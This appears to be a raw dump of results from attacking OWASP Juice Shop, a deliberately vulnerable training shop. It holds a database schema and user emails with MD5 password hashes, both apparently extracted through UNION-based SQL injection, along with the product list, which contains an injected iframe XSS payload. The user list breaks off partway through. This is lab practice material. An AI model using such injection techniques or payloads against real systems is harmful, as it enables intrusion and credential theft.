<h1>Database schema:</h1>

{"status":"success","data":[{"id":null,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `Addresses` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `fullName` VARCHAR(255), `mobileNum` INTEGER, `zipCode` VARCHAR(255), `streetAddress` VARCHAR(255), `city` VARCHAR(255), `state` VARCHAR(255), `country` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `BasketItems` (`ProductId` INTEGER REFERENCES `Products` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `BasketId` INTEGER REFERENCES `Baskets` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, UNIQUE (`ProductId`, `BasketId`))","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `Baskets` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `coupon` VARCHAR(255), `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `Captchas` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `captchaId` INTEGER, `captcha` VARCHAR(255), `answer` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `Cards` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `fullName` VARCHAR(255), `cardNum` INTEGER, `expMonth` INTEGER, `expYear` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `Challenges` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `key` VARCHAR(255), `name` VARCHAR(255), `category` VARCHAR(255), `tags` VARCHAR(255), `description` VARCHAR(255), `difficulty` INTEGER, `hint` VARCHAR(255), `hintUrl` VARCHAR(255), `mitigationUrl` VARCHAR(255), `solved` TINYINT(1), `disabledEnv` VARCHAR(255), `tutorialOrder` NUMBER, `codingChallengeStatus` NUMBER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `Complaints` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `message` VARCHAR(255), `file` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `Deliveries` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `name` VARCHAR(255), `price` FLOAT, `deluxePrice` FLOAT, `eta` FLOAT, `icon` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `Feedbacks` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `comment` VARCHAR(255), `rating` INTEGER NOT NULL, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `ImageCaptchas` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `image` VARCHAR(255), `answer` VARCHAR(255), `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `createdAt` DATETIME, `updatedAt` DATETIME NOT NULL)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `Memories` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `caption` VARCHAR(255), `imagePath` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `PrivacyRequests` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `deletionRequested` TINYINT(1) DEFAULT 0, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `Products` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `name` VARCHAR(255), `description` VARCHAR(255), `price` DECIMAL, `deluxePrice` DECIMAL, `image` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `Quantities` (`ProductId` INTEGER REFERENCES `Products` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `limitPerUser` INTEGER DEFAULT NULL, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `Recycles` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `AddressId` INTEGER REFERENCES `Addresses` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `isPickup` TINYINT(1) DEFAULT 0, `date` DATETIME, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `SecurityAnswers` (`UserId` INTEGER UNIQUE REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `SecurityQuestionId` INTEGER REFERENCES `SecurityQuestions` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `answer` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `SecurityQuestions` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `question` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `Users` (`id` INTEGER PRIMARY KEY AUTOINCREMENT, `username` VARCHAR(255) DEFAULT '', `email` VARCHAR(255) UNIQUE, `password` VARCHAR(255), `role` VARCHAR(255) DEFAULT 'customer', `deluxeToken` VARCHAR(255) DEFAULT '', `lastLoginIp` VARCHAR(255) DEFAULT '0.0.0.0', `profileImage` VARCHAR(255) DEFAULT '/assets/public/images/uploads/default.svg', `totpSecret` VARCHAR(255) DEFAULT '', `isActive` TINYINT(1) DEFAULT 1, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, `deletedAt` DATETIME)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE `Wallets` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `balance` INTEGER DEFAULT 0, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9},{"id":"CREATE TABLE sqlite_sequence(name,seq)","name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}


<h1>Product List:</h1>
{
    "status": "success",
    "data": [
        {
            "id": 1,
            "name": "Apple Juice (1000ml)",
            "description": "The all-time classic.",
            "price": 1.99,
            "deluxePrice": 0.99,
            "image": "apple_juice.jpg",
            "createdAt": "2024-04-16 08:29:25.630 +00:00",
            "updatedAt": "2024-04-16 08:29:25.630 +00:00",
            "deletedAt": null
        },
        {
            "id": 2,
            "name": "Orange Juice (1000ml)",
            "description": "Made from oranges hand-picked by Uncle Dittmeyer.",
            "price": 2.99,
            "deluxePrice": 2.49,
            "image": "orange_juice.jpg",
            "createdAt": "2024-04-16 08:29:25.630 +00:00",
            "updatedAt": "2024-04-16 08:29:25.630 +00:00",
            "deletedAt": null
        },
        {
            "id": 3,
            "name": "Eggfruit Juice (500ml)",
            "description": "Now with even more exotic flavour.",
            "price": 8.99,
            "deluxePrice": 8.99,
            "image": "eggfruit_juice.jpg",
            "createdAt": "2024-04-16 08:29:25.630 +00:00",
            "updatedAt": "2024-04-16 08:29:25.630 +00:00",
            "deletedAt": null
        },
        {
            "id": 4,
            "name": "Raspberry Juice (1000ml)",
            "description": "Made from blended Raspberry Pi, water and sugar.",
            "price": 4.99,
            "deluxePrice": 4.99,
            "image": "raspberry_juice.jpg",
            "createdAt": "2024-04-16 08:29:25.630 +00:00",
            "updatedAt": "2024-04-16 08:29:25.630 +00:00",
            "deletedAt": null
        },
        {
            "id": 5,
            "name": "Lemon Juice (500ml)",
            "description": "Sour but full of vitamins.",
            "price": 2.99,
            "deluxePrice": 1.99,
            "image": "lemon_juice.jpg",
            "createdAt": "2024-04-16 08:29:25.630 +00:00",
            "updatedAt": "2024-04-16 08:29:25.630 +00:00",
            "deletedAt": null
        },
        {
            "id": 6,
            "name": "Banana Juice (1000ml)",
            "description": "Monkeys love it the most.",
            "price": 1.99,
            "deluxePrice": 1.99,
            "image": "banana_juice.jpg",
            "createdAt": "2024-04-16 08:29:25.630 +00:00",
            "updatedAt": "2024-04-16 08:29:25.630 +00:00",
            "deletedAt": null
        },
        {
            "id": 7,
            "name": "OWASP Juice Shop T-Shirt",
            "description": "Real fans wear it 24/7!",
            "price": 22.49,
            "deluxePrice": 22.49,
            "image": "fan_shirt.jpg",
            "createdAt": "2024-04-16 08:29:25.630 +00:00",
            "updatedAt": "2024-04-16 08:29:25.630 +00:00",
            "deletedAt": null
        },
        {
            "id": 8,
            "name": "OWASP Juice Shop CTF Girlie-Shirt",
            "description": "For serious Capture-the-Flag heroines only!",
            "price": 22.49,
            "deluxePrice": 22.49,
            "image": "fan_girlie.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 9,
            "name": "OWASP SSL Advanced Forensic Tool (O-Saft)",
            "description": "O-Saft is an easy to use tool to show information about SSL certificate and tests the SSL connection according given list of ciphers and various SSL configurations. <a href=\"https://www.owasp.org/index.php/O-Saft\" target=\"_blank\">More...</a>",
            "price": 0.01,
            "deluxePrice": 0.01,
            "image": "orange_juice.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 10,
            "name": "Christmas Super-Surprise-Box (2014 Edition)",
            "description": "Contains a random selection of 10 bottles (each 500ml) of our tastiest juices and an extra fan shirt for an unbeatable price! (Seasonal special offer! Limited availability!)",
            "price": 29.99,
            "deluxePrice": 29.99,
            "image": "undefined.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": "2024-04-16 08:29:25.672 +00:00"
        },
        {
            "id": 11,
            "name": "Rippertuer Special Juice",
            "description": "Contains a magical collection of the rarest fruits gathered from all around the world, like Cherymoya Annona cherimola, Jabuticaba Myrciaria cauliflora, Bael Aegle marmelos... and others, at an unbelievable price! <br/><span style=\"color:red;\">This item has been made unavailable because of lack of safety standards.</span> (This product is unsafe! We plan to remove it from the stock!)",
            "price": 16.99,
            "deluxePrice": 16.99,
            "image": "undefined.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": "2024-04-16 08:29:25.676 +00:00"
        },
        {
            "id": 12,
            "name": "OWASP Juice Shop Sticker (2015/2016 design)",
            "description": "Die-cut sticker with the official 2015/2016 logo. By now this is a rare collectors item. <em>Out of stock!</em>",
            "price": 999.99,
            "deluxePrice": 999.99,
            "image": "sticker.png",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": "2024-04-16 08:29:25.678 +00:00"
        },
        {
            "id": 13,
            "name": "OWASP Juice Shop Iron-Ons (16pcs)",
            "description": "Upgrade your clothes with washer safe <a href=\"https://www.stickeryou.com/products/owasp-juice-shop/794\" target=\"_blank\">iron-ons</a> of the OWASP Juice Shop or CTF Extension logo!",
            "price": 14.99,
            "deluxePrice": 14.99,
            "image": "iron-on.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 14,
            "name": "OWASP Juice Shop Magnets (16pcs)",
            "description": "Your fridge will be even cooler with these OWASP Juice Shop or CTF Extension logo <a href=\"https://www.stickeryou.com/products/owasp-juice-shop/794\" target=\"_blank\">magnets</a>!",
            "price": 15.99,
            "deluxePrice": 15.99,
            "image": "magnets.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 15,
            "name": "OWASP Juice Shop Sticker Page",
            "description": "Massive decoration opportunities with these OWASP Juice Shop or CTF Extension <a href=\"https://www.stickeryou.com/products/owasp-juice-shop/794\" target=\"_blank\">sticker pages</a>! Each page has 16 stickers on it.",
            "price": 9.99,
            "deluxePrice": 9.99,
            "image": "sticker_page.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 16,
            "name": "OWASP Juice Shop Sticker Single",
            "description": "Super high-quality vinyl <a href=\"https://www.stickeryou.com/products/owasp-juice-shop/794\" target=\"_blank\">sticker single</a> with the OWASP Juice Shop or CTF Extension logo! The ultimate laptop decal!",
            "price": 4.99,
            "deluxePrice": 4.99,
            "image": "sticker_single.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 17,
            "name": "OWASP Juice Shop Temporary Tattoos (16pcs)",
            "description": "Get one of these <a href=\"https://www.stickeryou.com/products/owasp-juice-shop/794\" target=\"_blank\">temporary tattoos</a> to proudly wear the OWASP Juice Shop or CTF Extension logo on your skin! If you tweet a photo of yourself with the tattoo, you get a couple of our stickers for free! Please mention <a href=\"https://twitter.com/owasp_juiceshop\" target=\"_blank\"><code>@owasp_juiceshop</code></a> in your tweet!",
            "price": 14.99,
            "deluxePrice": 14.99,
            "image": "tattoo.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 18,
            "name": "OWASP Juice Shop Mug",
            "description": "Black mug with regular logo on one side and CTF logo on the other! Your colleagues will envy you!",
            "price": 21.99,
            "deluxePrice": 21.99,
            "image": "fan_mug.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 19,
            "name": "OWASP Juice Shop Hoodie",
            "description": "Mr. Robot-style apparel. But in black. And with logo.",
            "price": 49.99,
            "deluxePrice": 49.99,
            "image": "fan_hoodie.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 20,
            "name": "OWASP Juice Shop-CTF Velcro Patch",
            "description": "4x3.5\" embroidered patch with velcro backside. The ultimate decal for every tactical bag or backpack!",
            "price": 2.92,
            "deluxePrice": 2.92,
            "image": "velcro-patch.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 21,
            "name": "Woodruff Syrup \"Forest Master X-Treme\"",
            "description": "Harvested and manufactured in the Black Forest, Germany. Can cause hyperactive behavior in children. Can cause permanent green tongue when consumed undiluted.",
            "price": 6.99,
            "deluxePrice": 6.99,
            "image": "woodruff_syrup.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 22,
            "name": "Green Smoothie",
            "description": "Looks poisonous but is actually very good for your health! Made from green cabbage, spinach, kiwi and grass.",
            "price": 1.99,
            "deluxePrice": 1.99,
            "image": "green_smoothie.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 23,
            "name": "Quince Juice (1000ml)",
            "description": "Juice of the <em>Cydonia oblonga</em> fruit. Not exactly sweet but rich in Vitamin C.",
            "price": 4.99,
            "deluxePrice": 4.99,
            "image": "quince.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 24,
            "name": "Apple Pomace",
            "description": "Finest pressings of apples. Allergy disclaimer: Might contain traces of worms. Can be <a href=\"/#recycle\">sent back to us</a> for recycling.",
            "price": 0.89,
            "deluxePrice": 0.89,
            "image": "apple_pressings.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 25,
            "name": "Fruit Press",
            "description": "Fruits go in. Juice comes out. Pomace you can send back to us for recycling purposes.",
            "price": 89.99,
            "deluxePrice": 89.99,
            "image": "fruit_press.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 26,
            "name": "OWASP Juice Shop Logo (3D-printed)",
            "description": "This rare item was designed and handcrafted in Sweden. This is why it is so incredibly expensive despite its complete lack of purpose.",
            "price": 99.99,
            "deluxePrice": 99.99,
            "image": "3d_keychain.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 27,
            "name": "Juice Shop Artwork",
            "description": "Unique masterpiece painted with different kinds of juice on 90g/m² lined paper.",
            "price": 278.74,
            "deluxePrice": 278.74,
            "image": "artwork.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": "2024-04-16 08:29:25.715 +00:00"
        },
        {
            "id": 28,
            "name": "Global OWASP WASPY Award 2017 Nomination",
            "description": "Your chance to nominate up to three quiet pillars of the OWASP community ends 2017-06-30! <a href=\"https://www.owasp.org/index.php/WASPY_Awards_2017\">Nominate now!</a>",
            "price": 0.03,
            "deluxePrice": 0.03,
            "image": "waspy.png",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": "2024-04-16 08:29:25.718 +00:00"
        },
        {
            "id": 29,
            "name": "Strawberry Juice (500ml)",
            "description": "Sweet & tasty!",
            "price": 3.99,
            "deluxePrice": 3.99,
            "image": "strawberry_juice.jpeg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 30,
            "name": "Carrot Juice (1000ml)",
            "description": "As the old German saying goes: \"Carrots are good for the eyes. Or has anyone ever seen a rabbit with glasses?\"",
            "price": 2.99,
            "deluxePrice": 2.99,
            "image": "carrot_juice.jpeg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 31,
            "name": "OWASP Juice Shop Sweden Tour 2017 Sticker Sheet (Special Edition)",
            "description": "10 sheets of Sweden-themed stickers with 15 stickers on each.",
            "price": 19.1,
            "deluxePrice": 19.1,
            "image": "stickersheet_se.png",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": "2024-04-16 08:29:25.726 +00:00"
        },
        {
            "id": 32,
            "name": "Pwning OWASP Juice Shop",
            "description": "<em>The official Companion Guide</em> by Björn Kimminich available <a href=\"https://leanpub.com/juice-shop\">for free on LeanPub</a> and also <a href=\"https://pwning.owasp-juice.shop\">readable online</a>!",
            "price": 5.99,
            "deluxePrice": 5.99,
            "image": "cover_small.jpg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 33,
            "name": "Melon Bike (Comeback-Product 2018 Edition)",
            "description": "The wheels of this bicycle are made from real water melons. You might not want to ride it up/down the curb too hard.",
            "price": 2999,
            "deluxePrice": 2999,
            "image": "melon_bike.jpeg",
            "createdAt": "2024-04-16 08:29:25.631 +00:00",
            "updatedAt": "2024-04-16 08:29:25.631 +00:00",
            "deletedAt": null
        },
        {
            "id": 34,
            "name": "OWASP Juice Shop Coaster (10pcs)",
            "description": "Our 95mm circle coasters are printed in full color and made from thick, premium coaster board.",
            "price": 19.99,
            "deluxePrice": 19.99,
            "image": "coaster.jpg",
            "createdAt": "2024-04-16 08:29:25.632 +00:00",
            "updatedAt": "2024-04-16 08:29:25.632 +00:00",
            "deletedAt": null
        },
        {
            "id": 35,
            "name": "OWASP Snakes and Ladders - Web Applications",
            "description": "This amazing web application security awareness board game is <a href=\"https://steamcommunity.com/sharedfiles/filedetails/?id=1969196030\">available for Tabletop Simulator on Steam Workshop</a> now!",
            "price": 0.01,
            "deluxePrice": 0.01,
            "image": "snakes_ladders.jpg",
            "createdAt": "2024-04-16 08:29:25.632 +00:00",
            "updatedAt": "2024-04-16 08:29:25.632 +00:00",
            "deletedAt": null
        },
        {
            "id": 36,
            "name": "OWASP Snakes and Ladders - Mobile Apps",
            "description": "This amazing mobile app security awareness board game is <a href=\"https://steamcommunity.com/sharedfiles/filedetails/?id=1970691216\">available for Tabletop Simulator on Steam Workshop</a> now!",
            "price": 0.01,
            "deluxePrice": 0.01,
            "image": "snakes_ladders_m.jpg",
            "createdAt": "2024-04-16 08:29:25.632 +00:00",
            "updatedAt": "2024-04-16 08:29:25.632 +00:00",
            "deletedAt": null
        },
        {
            "id": 37,
            "name": "OWASP Juice Shop Holographic Sticker",
            "description": "Die-cut holographic sticker. Stand out from those 08/15-sticker-covered laptops with this shiny beacon of 80's coolness!",
            "price": 2,
            "deluxePrice": 2,
            "image": "holo_sticker.png",
            "createdAt": "2024-04-16 08:29:25.632 +00:00",
            "updatedAt": "2024-04-16 08:29:25.632 +00:00",
            "deletedAt": null
        },
        {
            "id": 38,
            "name": "OWASP Juice Shop \"King of the Hill\" Facemask",
            "description": "Facemask with compartment for filter from 50% cotton and 50% polyester.",
            "price": 13.49,
            "deluxePrice": 13.49,
            "image": "fan_facemask.jpg",
            "createdAt": "2024-04-16 08:29:25.632 +00:00",
            "updatedAt": "2024-04-16 08:29:25.632 +00:00",
            "deletedAt": null
        },
        {
            "id": 39,
            "name": "Juice Shop Adversary Trading Card (Common)",
            "description": "Common rarity \"Juice Shop\" card for the <a href=\"https://docs.google.com/forms/d/e/1FAIpQLSecLEakawSQ56lBe2JOSbFwFYrKDCIN7Yd3iHFdQc5z8ApwdQ/viewform\">Adversary Trading Cards</a> CCG.",
            "price": 2.99,
            "deluxePrice": 0.99,
            "image": "ccg_common.png",
            "createdAt": "2024-04-16 08:29:25.632 +00:00",
            "updatedAt": "2024-04-16 08:29:25.632 +00:00",
            "deletedAt": "2024-04-16 08:29:25.748 +00:00"
        },
        {
            "id": 40,
            "name": "Juice Shop Adversary Trading Card (Super Rare)",
            "description": "Super rare \"Juice Shop\" card with holographic foil-coating for the <a href=\"https://docs.google.com/forms/d/e/1FAIpQLSecLEakawSQ56lBe2JOSbFwFYrKDCIN7Yd3iHFdQc5z8ApwdQ/viewform\">Adversary Trading Cards</a> CCG.",
            "price": 99.99,
            "deluxePrice": 69.99,
            "image": "ccg_foil.png",
            "createdAt": "2024-04-16 08:29:25.632 +00:00",
            "updatedAt": "2024-04-16 08:29:25.632 +00:00",
            "deletedAt": "2024-04-16 08:29:25.751 +00:00"
        },
        {
            "id": 41,
            "name": "Juice Shop \"Permafrost\" 2020 Edition",
            "description": "Exact version of <a href=\"https://github.com/juice-shop/juice-shop/releases/tag/v9.3.1-PERMAFROST\">OWASP Juice Shop that was archived on 02/02/2020</a> by the GitHub Archive Program and ultimately went into the <a href=\"https://github.blog/2020-07-16-github-archive-program-the-journey-of-the-worlds-open-source-code-to-the-arctic\">Arctic Code Vault</a> on July 8. 2020 where it will be safely stored for at least 1000 years.",
            "price": 9999.99,
            "deluxePrice": 9999.99,
            "image": "permafrost.jpg",
            "createdAt": "2024-04-16 08:29:25.632 +00:00",
            "updatedAt": "2024-04-16 08:29:25.632 +00:00",
            "deletedAt": null
        },
        {
            "id": 42,
            "name": "Best Juice Shop Salesman Artwork",
            "description": "Unique digital painting depicting Stan, our most qualified and almost profitable salesman. He made a succesful carreer in selling used ships, coffins, krypts, crosses, real estate, life insurance, restaurant supplies, voodoo enhanced asbestos and courtroom souvenirs before <em>finally</em> adding his expertise to the Juice Shop marketing team.",
            "price": 5000,
            "deluxePrice": 5000,
            "image": "artwork2.jpg",
            "createdAt": "2024-04-16 08:29:25.632 +00:00",
            "updatedAt": "2024-04-16 08:29:25.632 +00:00",
            "deletedAt": null
        },
        {
            "id": 43,
            "name": "OWASP Juice Shop Card (non-foil)",
            "description": "Mythic rare <small><em>(obviously...)</em></small> card \"OWASP Juice Shop\" with three distinctly useful abilities. Alpha printing, mint condition. A true collectors piece to own!",
            "price": 1000,
            "deluxePrice": 1000,
            "image": "card_alpha.jpg",
            "createdAt": "2024-04-16 08:29:25.632 +00:00",
            "updatedAt": "2024-04-16 08:29:25.632 +00:00",
            "deletedAt": null
        },
        {
            "id": 44,
            "name": "20th Anniversary Celebration Ticket",
            "description": "Get your <a href=\"https://20thanniversary.owasp.org/\" target=\"_blank\">free 🎫 for OWASP 20th Anniversary Celebration</a> online conference! Hear from world renowned keynotes and special speakers, network with your peers and interact with our event sponsors. With an anticipated 10k+ attendees from around the world, you will not want to miss this live on-line event!",
            "price": 1e-20,
            "deluxePrice": 1e-20,
            "image": "20th.jpeg",
            "createdAt": "2024-04-16 08:29:25.632 +00:00",
            "updatedAt": "2024-04-16 08:29:25.632 +00:00",
            "deletedAt": "2024-04-16 08:29:25.761 +00:00"
        },
        {
            "id": 46,
            "name": "XSS",
            "description": "<iframe src=\"javascript:alert(`xss`)\">",
            "price": 47.11,
            "deluxePrice": null,
            "image": null,
            "createdAt": "2024-04-16 09:21:54.599 +00:00",
            "updatedAt": "2024-04-16 09:21:54.599 +00:00",
            "deletedAt": null
        }
    ]
}


<h1>Users List:</h1>

{
    "status": "success",
    "data": [
        {
            "id": 1,
            "name": "admin@juice-sh.op",
            "description": "0192023a7bbd73250516f069df18b500",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 2,
            "name": "jim@juice-sh.op",
            "description": "e541ca7ecf72b8d1286474fc613e5e45",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 3,
            "name": "bender@juice-sh.op",
            "description": "0c36e517e3fa95aabf1bbffc6744a4ef",
            "price": "4",
            "deluxePrice": "5",
            "image": "6",
            "createdAt": "7",
            "updatedAt": "8",
            "deletedAt": "9"
        },
        {
            "id": 4,
